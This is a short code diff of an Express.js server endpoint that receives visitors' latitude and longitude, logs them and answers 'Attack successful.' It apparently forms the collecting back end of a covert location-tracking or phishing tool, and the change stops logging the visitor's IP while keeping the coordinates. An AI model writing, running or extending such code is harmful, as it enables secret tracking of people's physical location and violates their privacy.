@@ -11,9 +11,9 @@ app.set("trust proxy", true)
 
 app.post("/get-location", (req, res) => {
   const { latitude, longitude } = req.body;
-  const IP = req.ip;
+  // const IP = req.ip;
 
-    console.log(`GOT LOCATION:\n IP: ${IP}\n Latitude: ${latitude}\n Longitude: ${longitude}`);
+    console.log(`GOT LOCATION:\n  ${latitude}\n Longitude: ${longitude}`);
     res.send("Attack successful.");
 
 });
